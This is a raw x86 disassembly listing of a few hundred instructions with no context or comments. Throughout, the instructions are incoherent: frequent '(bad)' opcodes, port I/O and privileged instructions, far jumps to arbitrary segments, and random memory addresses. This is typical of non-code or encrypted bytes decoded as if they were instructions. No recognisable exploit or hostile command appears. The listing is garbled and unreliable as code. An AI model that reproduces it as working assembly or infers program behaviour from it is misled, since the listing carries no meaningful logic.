  6b79db:	jmp    0x94551a5b
  6b79e0:	xor    eax,0x6fc6fe49
  6b79e5:	call   FWORD PTR [ecx+0x7a2abbd1]
  6b79eb:	out    dx,al
  6b79ec:	dec    esp
  6b79ed:	add    BYTE PTR es:[ecx+0x75],bl
  6b79f1:	jno    0x6b79ed
  6b79f3:	gs call 0xd769347c
  6b79f9:	lock adc esi,DWORD PTR [ecx-0x615f4e6]
  6b7a00:	sub    ebx,ecx
  6b7a02:	call   0xc417bd0
  6b7a07:	pop    es
  6b7a08:	xor    DWORD PTR [ebp-0x51a8b10e],edi
  6b7a0e:	loopne 0x6b79ea
  6b7a10:	inc    edi
  6b7a11:	pop    ebp
  6b7a12:	xor    DWORD PTR ds:0x8978a75f,eax
  6b7a18:	lds    ebp,FWORD PTR [ecx+0x1e48a3b9]
  6b7a1e:	mov    WORD PTR [ebx+0x6cf31023],cs
  6b7a24:	dec    ebp
  6b7a25:	test   bh,0x71
  6b7a28:	inc    edi
  6b7a29:	sti    
  6b7a2a:	jb     0x6b7a6b
  6b7a2c:	shl    ebx,0x11
  6b7a2f:	iret   
  6b7a30:	jp     0x6b7a9b
  6b7a32:	pop    esp
  6b7a33:	jns    0x6b79c8
  6b7a35:	add    eax,0x6eae8f12
  6b7a3a:	mov    dh,0x75
  6b7a3c:	repnz cmp eax,0x58121db8
  6b7a42:	inc    ebp
  6b7a43:	bnd jge 0x6b7a4b
  6b7a46:	ins    DWORD PTR es:[edi],dx
  6b7a47:	inc    eax
  6b7a48:	and    esp,DWORD PTR [ecx+0x29]
  6b7a4b:	scas   eax,DWORD PTR es:[edi]
  6b7a4c:	fadd   QWORD PTR [esi+edx*4-0x74534a60]
  6b7a53:	aad    0x17
  6b7a55:	mov    edi,0x7ab232fa
  6b7a5a:	ficomp WORD PTR [edi]
  6b7a5c:	mov    dl,0xb7
  6b7a5e:	popa   
  6b7a5f:	(bad)
  6b7a62:	stc    
  6b7a63:	inc    ebx
  6b7a64:	jae    0x6b7a54
  6b7a66:	adc    eax,0xb5b0bfee
  6b7a6b:	and    BYTE PTR [eax+ebx*2+0x3e],0x7b
  6b7a70:	sub    dl,ah
  6b7a72:	xor    DWORD PTR [esi+0x2d4a195f],edx
  6b7a78:	(bad)  
  6b7a79:	lock fwait
  6b7a7b:	in     al,dx
  6b7a7c:	add    eax,0x7be71ca3
  6b7a81:	in     eax,dx
  6b7a82:	(bad)  
  6b7a83:	push   0x48
  6b7a85:	test   esp,0x84e701f3
  6b7a8b:	das    
  6b7a8c:	mov    ds:0x934116f9,al
  6b7a91:	mov    al,ds:0xce1ccd26
  6b7a96:	dec    edx
  6b7a97:	and    BYTE PTR [ecx-0x4bd6d7b8],dh
  6b7a9d:	popa   
  6b7a9e:	mov    ebp,0x63bd9dae
  6b7aa3:	enter  0x2e12,0xfb
  6b7aa7:	push   es
  6b7aa8:	leave  
  6b7aa9:	out    0x2d,al
  6b7aab:	inc    edi
  6b7aac:	rol    DWORD PTR [esi],cl
  6b7aae:	js     0x6b7b10
  6b7ab0:	daa    
  6b7ab1:	in     al,0xba
  6b7ab3:	add    BYTE PTR [ebx+0x5255e486],0x21
  6b7aba:	adc    eax,0x7302b33b
  6b7abf:	jno    0x6b7b1b
  6b7ac1:	test   al,0xb0
  6b7ac3:	jp     0x6b7b38
  6b7ac5:	out    dx,al
  6b7ac6:	mov    dh,0x6f
  6b7ac8:	arpl   si,bx
  6b7aca:	pop    eax
  6b7acb:	push   ebx
  6b7acc:	iret   
  6b7acd:	push   esi
  6b7ace:	mov    ebp,ecx
  6b7ad0:	jp     0x6b7afd
  6b7ad2:	push   es
  6b7ad3:	inc    esp
  6b7ad4:	add    esi,DWORD PTR [edi]
  6b7ad6:	mov    dh,0x3b
  6b7ad8:	jo     0x6b7afc
  6b7ada:	jno    0x6b7b0c
  6b7adc:	mov    ah,0x48
  6b7ade:	sub    eax,0xec637c18
  6b7ae3:	out    dx,eax
  6b7ae4:	unpcklps xmm2,XMMWORD PTR [ebx+0x54613bc2]
  6b7aeb:	test   DWORD PTR [ecx],eax
  6b7aed:	fisub  WORD PTR [ebp+0x6e675898]
  6b7af3:	(bad)  [esi-0x2e]
  6b7af6:	out    0x2a,eax
  6b7af8:	lods   eax,DWORD PTR ds:[esi]
  6b7af9:	add    bh,BYTE PTR [edi]
  6b7afb:	mov    al,0x9a
  6b7afd:	shl    DWORD PTR [ebx+0x71ec9574],cl
  6b7b03:	je     0x6b7b43
  6b7b05:	outs   dx,DWORD PTR ds:[esi]
  6b7b06:	adc    esp,DWORD PTR [ecx]
  6b7b08:	test   bh,cl
  6b7b0a:	imul   eax,esp,0x24
  6b7b0d:	mov    ebp,0x9c00a195
  6b7b12:	and    BYTE PTR [edi],dl
  6b7b14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b7b15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b7b16:	lea    edi,[edi]
  6b7b18:	imul   edi,edi,0x49ef50ef
  6b7b1e:	cs enter 0xe55b,0xa1
  6b7b23:	cld    
  6b7b24:	jbe    0x6b7b32
  6b7b26:	sbb    edi,DWORD PTR [edx-0x2e]
  6b7b29:	popa   
  6b7b2a:	(bad)  
  6b7b2b:	mov    ah,0xa1
  6b7b2d:	(bad)  
  6b7b2e:	clc    
  6b7b2f:	pop    esi
  6b7b30:	adc    eax,esi
  6b7b32:	dec    edi
  6b7b33:	pop    ebx
  6b7b34:	jmp    0x6b7b5c
  6b7b36:	rol    DWORD PTR [ecx],1
  6b7b38:	mov    edi,ecx
  6b7b3a:	xor    BYTE PTR [ebx+0x5b839864],cl
  6b7b40:	aaa    
  6b7b41:	inc    eax
  6b7b42:	call   0x94d0:0x5cf3ace7
  6b7b49:	cli    
  6b7b4a:	and    ebp,esp
  6b7b4c:	popf   
  6b7b4d:	sbb    al,cl
  6b7b4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b7b50:	or     al,0xc9
  6b7b52:	fist   WORD PTR [edi-0x2f]
  6b7b55:	int    0xda
  6b7b57:	adc    DWORD PTR [ecx+0x32],edx
  6b7b5a:	inc    esi
  6b7b5b:	cmp    esp,DWORD PTR [edx]
  6b7b5d:	or     al,0xfb
  6b7b5f:	lds    edx,FWORD PTR [ecx+0x6a129b84]
  6b7b65:	dec    esi
  6b7b66:	aas    
  6b7b67:	mov    al,ds:0x5a5feec9
  6b7b6c:	in     eax,0xd5
  6b7b6e:	ret    0x428c
  6b7b71:	push   esp
  6b7b72:	mov    al,ds:0x94fcaaeb
  6b7b77:	bound  esi,QWORD PTR [ebp+0x2457715c]
  6b7b7d:	imul   eax,DWORD PTR [edi],0x7
  6b7b80:	out    0xde,al
  6b7b82:	mov    ds:0xcef4cf76,al
  6b7b87:	in     al,dx
  6b7b88:	push   cs
  6b7b89:	fwait
  6b7b8a:	and    al,BYTE PTR [esi+0x5ad933e5]
  6b7b90:	jb     0x6b7b9e
  6b7b92:	sbb    esp,edi
  6b7b94:	popf   
  6b7b95:	sbb    dh,BYTE PTR [edi+0x5bca6c05]
  6b7b9b:	fnstcw WORD PTR [ecx]
  6b7b9d:	out    dx,al
  6b7b9e:	pop    edi
  6b7b9f:	push   edx
  6b7ba0:	xchg   edx,eax
  6b7ba1:	fs pop ebp
  6b7ba3:	xchg   ecx,eax
  6b7ba4:	inc    esp
  6b7ba5:	nop
  6b7ba6:	xor    al,0x80
  6b7ba8:	and    esi,0x2899aa8
  6b7bae:	push   ebx
  6b7baf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b7bb0:	or     ebp,DWORD PTR [ebx+0xe]
  6b7bb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b7bb4:	popf   
  6b7bb5:	test   al,0x38
  6b7bb7:	fwait
  6b7bb8:	int3   
  6b7bb9:	jg     0x6b7c32
  6b7bbb:	sahf   
  6b7bbc:	sti    
  6b7bbd:	loop   0x6b7be4
  6b7bbf:	cld    
  6b7bc0:	xchg   DWORD PTR [edx],esi
  6b7bc2:	jmp    0x1ad7:0x9913c68c
  6b7bc9:	rcr    BYTE PTR [edi-0x7dc48f21],0xc6
  6b7bd0:	out    0x91,al
  6b7bd2:	out    dx,eax
  6b7bd3:	or     eax,0x9f5e5de3
  6b7bd8:	lock in eax,0x7
  6b7bdb:	xchg   edx,eax
  6b7bdc:	mov    edi,DWORD PTR [edi]
  6b7bde:	loope  0x6b7c4b
  6b7be0:	(bad)  
  6b7be2:	cmp    BYTE PTR [edi],cl
  6b7be4:	push   0x2b45d8c0
  6b7be9:	push   ebx
  6b7bea:	adc    esp,edi
  6b7bec:	add    DWORD PTR [edi-0x6daa940c],edi
  6b7bf2:	dec    esi
  6b7bf3:	jne    0x6b7b88
  6b7bf5:	cmp    al,0xe4
  6b7bf7:	call   0x4faf7e67
  6b7bfc:	rcl    bh,cl
  6b7bfe:	in     eax,dx
  6b7bff:	push   edi
  6b7c00:	clc    
  6b7c01:	sub    DWORD PTR [esp+ebp*1-0x56cb94fc],ecx
  6b7c08:	dec    ecx
  6b7c09:	xor    al,0x16
  6b7c0b:	adc    eax,0x4970d038
  6b7c10:	and    eax,0xb4f160b7
  6b7c15:	mov    ebx,0xac71ff9b
  6b7c1a:	pop    DWORD PTR [eax-0x3942408c]
  6b7c20:	mov    DWORD PTR [esi+0x25],0x1a86a38b
  6b7c27:	sbb    eax,DWORD PTR [ebp+0x52f17522]
  6b7c2d:	inc    esi
  6b7c2e:	pop    edx
  6b7c2f:	scas   eax,DWORD PTR es:[edi]
  6b7c30:	outs   dx,DWORD PTR ds:[esi]
  6b7c31:	mov    ecx,0xc1133eb3
  6b7c36:	lds    eax,FWORD PTR [eax+0x1e]
  6b7c39:	adc    eax,0x2ebcc2e9
  6b7c3e:	push   es
  6b7c3f:	stc    
  6b7c40:	xor    eax,0x2353f809
  6b7c45:	call   0xcd86:0x64e22e67
  6b7c4c:	in     al,dx
  6b7c4d:	scas   eax,DWORD PTR es:[edi]
  6b7c4e:	adc    eax,0x95eb988a
  6b7c53:	xor    edx,esp
  6b7c55:	inc    eax
  6b7c56:	pushf  
  6b7c57:	sbb    DWORD PTR [edi+0x38],ebp
  6b7c5a:	sub    al,al
  6b7c5c:	call   0xf8ae:0xd090a0f2
  6b7c63:	pop    edx
  6b7c64:	dec    ebx
  6b7c65:	push   edi
  6b7c66:	rcr    BYTE PTR [edx-0x1d7cc951],1
  6b7c6c:	retf   
  6b7c6d:	ins    DWORD PTR es:[edi],dx
  6b7c6e:	xor    bp,WORD PTR [edx+0x35]
  6b7c72:	sbb    edi,DWORD PTR [edx]
  6b7c74:	in     al,dx
  6b7c75:	and    DWORD PTR [ebx+0x615a1b6a],0xffffff9d
  6b7c7c:	and    dh,0xd
  6b7c7f:	push   ss
  6b7c80:	jns    0x6b7c11
  6b7c82:	push   cs
  6b7c83:	inc    esp
  6b7c84:	add    eax,0x445bd9af
  6b7c89:	(bad)  
  6b7c8a:	jmp    0x6b7c1f
  6b7c8c:	xor    DWORD PTR [ebx-0x5d97199c],ecx
  6b7c92:	xchg   ebx,eax
  6b7c93:	outs   dx,DWORD PTR ds:[esi]
  6b7c94:	test   eax,0xa3490fc9
  6b7c99:	scas   al,BYTE PTR es:[edi]
  6b7c9a:	(bad)  [eax]
  6b7c9c:	fisubr DWORD PTR ds:0x5285ec61
  6b7ca2:	retf   
  6b7ca3:	sar    BYTE PTR [eax-0x4ada6aa9],cl
  6b7ca9:	inc    edi
  6b7caa:	xor    BYTE PTR [eax],dl
  6b7cac:	sbb    eax,0x8647e042
  6b7cb1:	rcl    BYTE PTR [eax],1
  6b7cb3:	mov    edi,0xed6f2aaf
  6b7cb8:	xchg   BYTE PTR [edx+0x67],dh
  6b7cbb:	mov    cl,0xae
  6b7cbd:	sar    esi,1
  6b7cbf:	fisub  DWORD PTR [ebp-0x5a]
  6b7cc2:	and    edi,DWORD PTR [ecx]
  6b7cc4:	mov    edi,esi
  6b7cc6:	or     esp,eax
  6b7cc8:	push   ebp
  6b7cc9:	gs dec esp
  6b7ccb:	mov    bl,0xfb
  6b7ccd:	std    
  6b7cce:	test   BYTE PTR cs:[edx+ebp*2],bl
  6b7cd2:	rcl    BYTE PTR ds:0x1b545b38,1
  6b7cd8:	and    DWORD PTR [esi],edx
  6b7cda:	dec    edx
  6b7cdb:	push   esi
  6b7cdc:	mov    ebp,?
  6b7cde:	fdivr  DWORD PTR [edx]
  6b7ce0:	mov    edi,0x878bc5c3
  6b7ce5:	rol    BYTE PTR [edi-0x127dcc18],cl
  6b7ceb:	into   
  6b7cec:	dec    eax
  6b7ced:	sbb    BYTE PTR ds:0x75895ca5,al
  6b7cf3:	call   0x71c5:0xd3319934
  6b7cfa:	xor    BYTE PTR [ebx+0x5d06b814],bl
  6b7d00:	stc    
  6b7d01:	dec    esi
  6b7d02:	add    al,0xb4
  6b7d04:	mov    ebx,edi
  6b7d06:	je     0x6b7cce
  6b7d08:	or     ecx,0x5c343c5e
  6b7d0e:	cli    
  6b7d0f:	sub    al,0x10
  6b7d11:	mov    bl,0x84
  6b7d13:	jge    0x6b7d6d
  6b7d15:	aam    0x51
  6b7d17:	ins    BYTE PTR es:[edi],dx
  6b7d18:	adc    dh,0xe5
  6b7d1b:	ss jno 0x6b7d85
  6b7d1e:	je     0x6b7ceb
  6b7d20:	fadd   DWORD PTR [ecx+0x5]
  6b7d23:	mov    es,WORD PTR ds:0x5c305fa
  6b7d29:	addr16 mov esi,0x541f03c6
  6b7d2f:	ret    0xcbd4
  6b7d32:	pop    es
  6b7d33:	dec    edi
  6b7d34:	pop    ss
  6b7d35:	pushf  
  6b7d36:	out    0xa,al
  6b7d38:	pop    esi
  6b7d39:	mov    ebx,0x2a46fae4
  6b7d3e:	sbb    dh,BYTE PTR [ecx+eax*1-0x5225f249]
  6b7d45:	inc    esp
  6b7d46:	loope  0x6b7d26
  6b7d48:	loop   0x6b7d80
  6b7d4a:	inc    ebp
  6b7d4b:	les    ecx,FWORD PTR [edx+0x34cfcf73]
  6b7d51:	shr    BYTE PTR [ecx+edx*2+0x27],cl
  6b7d55:	and    ch,dh
  6b7d57:	(bad)  
  6b7d59:	sub    al,0x2f
  6b7d5b:	xchg   edi,eax
  6b7d5c:	add    DWORD PTR [edx],ebx
  6b7d5e:	jnp    0x6b7d2e
  6b7d60:	fldcw  WORD PTR [esp+edi*2]
  6b7d63:	jp     0x6b7cf8
  6b7d65:	add    DWORD PTR [edi*2+0x11e26a2f],ecx
  6b7d6c:	or     DWORD PTR [eax-0x2efed3c7],ebx
  6b7d72:	mov    cl,0xaf
  6b7d74:	jns    0x6b7d69
  6b7d76:	pop    es
  6b7d77:	push   edi
  6b7d78:	or     eax,0x5525ae35
  6b7d7d:	and    eax,0x3b581e7
  6b7d82:	in     al,0x91
  6b7d84:	mov    ebp,0x59f76230
  6b7d89:	mov    ecx,cs
  6b7d8b:	push   edi
  6b7d8c:	sahf   
  6b7d8d:	imul   ecx,esp,0xffffffb5
  6b7d90:	bound  ebx,QWORD PTR [bp+si+0x1b7f]
  6b7d95:	repz retf 
  6b7d97:	adc    DWORD PTR [edi+0x4b],edx
  6b7d9a:	pop    edx
  6b7d9b:	cmovno edi,DWORD PTR [ebx-0x77]
  6b7d9f:	adc    DWORD PTR [edx],0x8080d3fe
  6b7da5:	push   0x23
  6b7da7:	xor    al,0xf2
  6b7da9:	jae    0x6b7dea
  6b7dab:	inc    ecx
  6b7dac:	jo     0x6b7db7
  6b7dae:	sub    BYTE PTR [ebp-0x57],dl
  6b7db1:	mov    eax,gs:0xd24fd7f4
  6b7db7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b7db8:	cmp    bh,BYTE PTR [eax-0x32df8271]
  6b7dbe:	daa    
  6b7dbf:	xchg   BYTE PTR [ebp+0x6d3f2002],bl
  6b7dc5:	push   0xefb6b941
  6b7dca:	xchg   esp,eax
  6b7dcb:	jmp    FWORD PTR [ebp+0x39a31a37]
  6b7dd1:	jo     0x6b7e05
  6b7dd3:	pop    ecx
  6b7dd4:	sub    esp,edx
  6b7dd6:	add    ebp,DWORD PTR [ebx]
  6b7dd8:	aad    0xf4
  6b7dda:	(bad)  
  6b7ddb:	push   edx
  6b7ddc:	xchg   edi,eax
  6b7ddd:	cmp    eax,0x3f67376e
  6b7de2:	lahf   
  6b7de3:	int    0x1d
  6b7de5:	sbb    al,0x5b
  6b7de7:	jle    0x6b7e58
  6b7de9:	mov    cl,0xa1
  6b7deb:	outs   dx,DWORD PTR ds:[esi]
  6b7dec:	cmp    cl,BYTE PTR [eax+0x12]
  6b7def:	mov    edi,DWORD PTR [ebx]
  6b7df1:	dec    ebx
  6b7df2:	cs ins DWORD PTR es:[edi],dx
  6b7df4:	adc    al,0xb7
  6b7df6:	inc    ebp
  6b7df7:	rol    ecx,0x70
  6b7dfa:	xchg   DWORD PTR [ebx-0x7fc7133e],ecx
  6b7e00:	ja     0x6b7e00
  6b7e02:	mov    ah,dh
  6b7e04:	imul   ebx,DWORD PTR [esi+edx*1],0xe4da8470
  6b7e0b:	adc    ecx,esi
  6b7e0d:	in     al,dx
  6b7e0e:	loope  0x6b7db1
  6b7e10:	mov    esp,0xdb05aa2c
  6b7e15:	pop    ss
  6b7e16:	or     bh,BYTE PTR [eax]
  6b7e18:	dec    edx
  6b7e19:	cwde   
  6b7e1a:	repnz xchg esi,eax
  6b7e1c:	push   ebx
  6b7e1d:	mov    ds:0x5dea95d5,eax
  6b7e22:	fsub   st,st(7)
  6b7e24:	gs dec ebp
  6b7e26:	push   ds
  6b7e27:	jbe    0x6b7dc6
  6b7e29:	(bad)
  6b7e2d:	cli    
  6b7e2e:	(bad)
  6b7e31:	mov    al,0x7a
  6b7e33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b7e34:	es jne 0x6b7df9
  6b7e37:	in     al,0xf9
  6b7e39:	imul   ebp,DWORD PTR [ebx+0x1b],0x73b0a096
  6b7e40:	push   0x44
  6b7e42:	lds    eax,FWORD PTR [esi]
  6b7e44:	xor    al,BYTE PTR [ebx]
  6b7e46:	repnz aam 0xe9
  6b7e49:	addr16 jmp 0x58727ec2
  6b7e4f:	push   eax
  6b7e50:	mov    cl,0xe4
  6b7e52:	xor    ah,BYTE PTR [esi+0x73]
  6b7e55:	sbb    dh,0x3
  6b7e58:	js     0x6b7e3a
  6b7e5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b7e5b:	rol    BYTE PTR [edi+esi*2-0x7e5aef63],0x19
  6b7e63:	aad    0x72
  6b7e65:	int3   
  6b7e66:	mov    esi,0x9715319a
  6b7e6b:	push   0xb60ae6b4
  6b7e70:	jge    0x6b7e8a
  6b7e72:	sub    DWORD PTR [eax+0x525d9183],ebp
  6b7e78:	out    dx,al
  6b7e79:	mov    ds:0x151e9f33,al
  6b7e7e:	cmp    al,ah
  6b7e80:	frstor [edi]
  6b7e82:	test   BYTE PTR [ecx],bl
  6b7e84:	xchg   ebx,eax
  6b7e85:	ror    BYTE PTR [edx+0x4a],cl
  6b7e88:	test   bl,0x9b
  6b7e8b:	add    eax,0x4066fdc2
  6b7e90:	cs test eax,0x2e327ea5
  6b7e96:	or     al,0xef
  6b7e98:	xchg   esp,eax
  6b7e99:	mov    fs,WORD PTR [esi-0xa]
  6b7e9c:	and    al,BYTE PTR [edx]
  6b7e9e:	cwde   
  6b7e9f:	stos   BYTE PTR es:[edi],al
  6b7ea0:	ror    ecx,0x92
  6b7ea3:	rol    ch,1
  6b7ea5:	in     eax,0xf0
  6b7ea7:	jge    0x6b7e7a
  6b7ea9:	push   esp
  6b7eaa:	cwde   
  6b7eab:	arpl   WORD PTR [ecx+0x59f17cb4],di
  6b7eb1:	lods   al,BYTE PTR ds:[esi]
  6b7eb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b7eb3:	ret    
  6b7eb4:	or     DWORD PTR [edx+ebx*8+0x42],0x5a68cec7
  6b7ebc:	in     al,0x89
  6b7ebe:	shr    BYTE PTR [edi+0x3d],0xa
  6b7ec2:	addr16 adc eax,0xd04c3348
  6b7ec8:	mov    ?,WORD PTR [edi+edx*1-0x63]
  6b7ecc:	pop    DWORD PTR es:[ebp-0x79b08092]
  6b7ed3:	mov    bl,dl
  6b7ed5:	xchg   BYTE PTR [esi+0x583d7804],ch
  6b7edb:	(bad)  
  6b7edc:	mov    edi,DWORD PTR [ebx]
  6b7ede:	xchg   esp,eax
  6b7edf:	mov    ah,0xdf
  6b7ee1:	push   edi
  6b7ee2:	cmp    dh,BYTE PTR [ecx+edi*2-0x17ceb84]
  6b7ee9:	inc    ebp
  6b7eea:	push   0x139bdd6b
  6b7eef:	inc    ebx
  6b7ef0:	retf   
  6b7ef1:	mov    ebx,0xbc09334d
  6b7ef6:	imul   eax,DWORD PTR [esi],0xc126cebd
  6b7efc:	xchg   esp,eax
  6b7efd:	(bad)  [esi-0x42b2fc73]
  6b7f03:	dec    esi
  6b7f04:	lahf   
  6b7f05:	pop    ds
  6b7f06:	mov    ebp,0xe2c5807
  6b7f0b:	cmp    ah,BYTE PTR [ecx+0x70]
  6b7f0e:	std    
  6b7f0f:	sbb    BYTE PTR es:[eax+0x49],bh
  6b7f13:	mov    al,ds:0xba57810
  6b7f18:	jne    0x6b7ee4
  6b7f1a:	bnd jnp 0x6b7f51
  6b7f1d:	in     al,0x2
  6b7f1f:	mov    eax,ds:0x1e02af15
  6b7f24:	retf   
  6b7f25:	adc    al,0xc5
  6b7f27:	mov    bl,0xad
  6b7f29:	push   es
  6b7f2a:	add    BYTE PTR [ebx+0x2d946909],0xca
  6b7f31:	inc    ebp
  6b7f32:	ins    DWORD PTR es:[edi],dx
  6b7f33:	jnp    0x6b7ec2
  6b7f35:	lods   eax,DWORD PTR ds:[esi]
  6b7f36:	fldl2t 
  6b7f38:	mov    edi,0x86dbb83b
  6b7f3d:	jle    0x6b7f9e
  6b7f3f:	pop    ds
  6b7f40:	sub    eax,0x62c9fb2
  6b7f45:	push   cs
  6b7f46:	das    
  6b7f47:	dec    esi
  6b7f48:	enter  0x52bd,0x44
  6b7f4c:	ror    DWORD PTR [edi],0xe6
  6b7f4f:	(bad)  
  6b7f51:	mov    edi,0xb16c89b7
  6b7f56:	fadd   QWORD PTR [edi-0x3c]
  6b7f59:	xchg   ebx,esi
  6b7f5b:	stos   DWORD PTR es:[edi],eax
  6b7f5c:	in     al,dx
  6b7f5d:	fbld   TBYTE PTR [ebp+0x29b2b396]
  6b7f63:	dec    edi
  6b7f64:	mov    edx,0x81bff5f9
  6b7f69:	inc    ebx
  6b7f6a:	and    eax,esi
  6b7f6c:	outs   dx,BYTE PTR ds:[esi]
  6b7f6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b7f6e:	jb     0x6b7fde
  6b7f70:	and    al,dl
  6b7f72:	arpl   ax,sp
  6b7f74:	out    dx,eax
  6b7f75:	push   edx
  6b7f76:	and    al,0x6a
  6b7f78:	test   BYTE PTR [edx-0x28e78761],bh
  6b7f7e:	ffreep st(6)
  6b7f80:	(bad)  
  6b7f81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b7f82:	xor    ebx,DWORD PTR [esi-0x5d]
  6b7f85:	xor    ah,BYTE PTR [ecx]
  6b7f87:	cmp    ebx,DWORD PTR [eax+edi*1]
  6b7f8a:	out    0x93,al
  6b7f8c:	pop    ss
  6b7f8d:	mov    edi,0x428243b1
  6b7f92:	mov    ch,0x6a
  6b7f94:	js     0x6b7fe3
  6b7f96:	jne    0x6b7fb2
  6b7f98:	or     ah,BYTE PTR [ecx-0x45d51ea5]
  6b7f9e:	jnp    0x6b7f28
  6b7fa0:	pop    ecx
  6b7fa1:	push   ebx
  6b7fa2:	shl    DWORD PTR [esi-0xb08eb53],cl
  6b7fa8:	jnp    0x6b7fdf
  6b7faa:	jo     0x6b7f42
  6b7fac:	retf   0x7718
  6b7faf:	xchg   DWORD PTR [edx-0x62c23205],edx
  6b7fb5:	xchg   edi,eax
  6b7fb6:	mov    edi,0x767d8ea0
  6b7fbb:	dec    edx
  6b7fbc:	aad    0x43
  6b7fbe:	je     0x6b7fe5
  6b7fc0:	test   eax,0x414079b
  6b7fc5:	mov    ebx,edx
  6b7fc7:	outs   dx,BYTE PTR ds:[esi]
  6b7fc8:	sub    al,0xb2
  6b7fca:	xlat   BYTE PTR ds:[ebx]
  6b7fcb:	dec    edx
  6b7fcc:	inc    esi
  6b7fcd:	jecxz  0x6b8040
  6b7fcf:	ror    BYTE PTR [edx],cl
  6b7fd1:	jmp    0xa020d4c5
  6b7fd6:	cmp    ebp,DWORD PTR [ecx]
  6b7fd8:	xor    bh,BYTE PTR [edx-0x5d7a95a9]
  6b7fde:	fdivr  QWORD PTR [edx]
  6b7fe0:	push   ebp
  6b7fe1:	add    DWORD PTR [eax+0x5ec6bba0],edx
  6b7fe7:	dec    ebx
  6b7fe8:	pusha  
  6b7fe9:	xlat   BYTE PTR ss:[ebx]
  6b7feb:	leave  
  6b7fec:	pop    edi
  6b7fed:	dec    edx
  6b7fee:	pop    es
  6b7fef:	mov    dl,0xef
  6b7ff1:	hlt    
  6b7ff2:	ins    BYTE PTR es:[edi],dx
  6b7ff3:	pop    ebx
  6b7ff4:	gs jg  0x6b8010
  6b7ff7:	test   eax,0xb02729cb
  6b7ffc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b7ffd:	and    al,0xa3
  6b7fff:	sub    eax,0x7bff180f
  6b8004:	mov    bl,0x2b
  6b8006:	push   0xffffff97
  6b8008:	in     al,dx
  6b8009:	sti    
  6b800a:	retf   0x5e5
  6b800d:	out    0x7a,al
  6b800f:	push   cs
  6b8010:	out    0xa1,al
  6b8012:	retf   0x8e4
  6b8015:	sahf   
  6b8016:	out    dx,eax
  6b8017:	int    0x18
  6b8019:	cmp    DWORD PTR [edx],ebp
  6b801b:	sbb    BYTE PTR [edi+0x4cc6fe52],ch
  6b8021:	push   esi
  6b8022:	adc    esi,DWORD PTR [ecx+0x6b]
  6b8025:	push   eax
  6b8026:	fwait
  6b8027:	sbb    DWORD PTR [edx-0x63],0x63
  6b802b:	ret    0xc5b3
  6b802e:	js     0x6b8005
  6b8030:	fldcw  WORD PTR [eax-0x40]
  6b8033:	dec    edx
  6b8034:	in     eax,0x61
  6b8036:	xchg   esi,eax
  6b8037:	js     0x6b8076
  6b8039:	icebp  
  6b803a:	xor    ah,BYTE PTR [edx]
  6b803c:	inc    ebx
  6b803d:	out    dx,al
  6b803e:	mov    eax,ds:0x1fbdfd5e
  6b8043:	add    DWORD PTR [ecx-0x41097f8b],ebp
  6b8049:	sub    al,0x79
  6b804b:	jecxz  0x6b8029
  6b804d:	mov    edi,edi
  6b804f:	jecxz  0x6b8071
  6b8051:	or     ebp,DWORD PTR [eax+0x584e5878]
  6b8057:	leave  
  6b8058:	call   0x2c199408
  6b805d:	out    dx,al
  6b805e:	cwde   
  6b805f:	es into 
  6b8061:	imul   eax,DWORD PTR [edx-0x7f]
  6b8065:	addr16 mov dl,0xce
  6b8068:	push   esi
  6b8069:	cli    
  6b806a:	lods   eax,DWORD PTR ds:[esi]
  6b806b:	adc    ch,BYTE PTR [ecx+0x6a]
  6b806e:	fbstp  TBYTE PTR [edx-0x411a5c34]
  6b8074:	sbb    eax,0x6dc11d29
  6b8079:	out    0x74,eax
  6b807b:	xor    DWORD PTR [edx+0x49],eax
  6b807e:	(bad)  
  6b807f:	(bad)  
  6b8080:	in     eax,0x6c
  6b8082:	stc    
  6b8083:	shl    BYTE PTR [edi+0x66],0x36
  6b8087:	dec    esp
  6b8088:	cmp    al,0x87
  6b808a:	iret   
  6b808b:	das    
  6b808c:	mov    ebx,0x500744dc
  6b8091:	xchg   esi,eax
  6b8092:	adc    DWORD PTR [eax],0x9d3cf603
  6b8098:	sahf   
  6b8099:	rol    BYTE PTR [edi],0xd
  6b809c:	iret   
  6b809d:	in     al,dx
  6b809e:	mov    edx,0xe99c4b5f
  6b80a3:	frstor [edi-0x452287c9]
  6b80a9:	push   ss
  6b80aa:	cdq    
  6b80ab:	jmp    0xedb9:0x559000bc
  6b80b2:	sbb    dh,BYTE PTR [edi+0x292458ce]
  6b80b8:	mov    edi,edx
  6b80ba:	pushf  
  6b80bb:	ror    ebx,cl
  6b80bd:	pop    ds
  6b80be:	idiv   BYTE PTR [edx]
  6b80c0:	cpuid  
  6b80c2:	loope  0x6b80be
  6b80c4:	xlat   BYTE PTR gs:[ebx]
  6b80c6:	lock int3 
  6b80c8:	pop    esp
  6b80c9:	pushf  
  6b80ca:	imul   edx,DWORD PTR [ebp+0x183e9fb2],0xbccd10eb
  6b80d4:	mov    ds:0xa1517b18,al
  6b80d9:	add    esi,ecx
  6b80db:	mov    eax,ds:0x618a15f9
  6b80e0:	jbe    0x6b80c3
  6b80e2:	(bad)  
  6b80e4:	(bad)  
  6b80e5:	mov    BYTE PTR [ebp+0x39089fb3],ch
  6b80eb:	cwde   
  6b80ec:	mov    al,0xf6
  6b80ee:	or     cl,ch
  6b80f0:	jbe    0x6b8102
  6b80f2:	aad    0x1a
  6b80f4:	outs   dx,BYTE PTR ds:[esi]
  6b80f5:	scas   al,BYTE PTR es:[edi]
  6b80f6:	dec    ecx
  6b80f7:	xor    al,0xbf
  6b80f9:	push   ebp
  6b80fa:	adc    al,0x71
  6b80fc:	pop    esp
  6b80fd:	(bad)  
  6b80fe:	cmc    
  6b80ff:	push   0x25
  6b8101:	jge    0x6b8180
  6b8103:	stos   DWORD PTR es:[edi],eax
  6b8104:	popa   
  6b8105:	dec    ebx
  6b8106:	push   ds
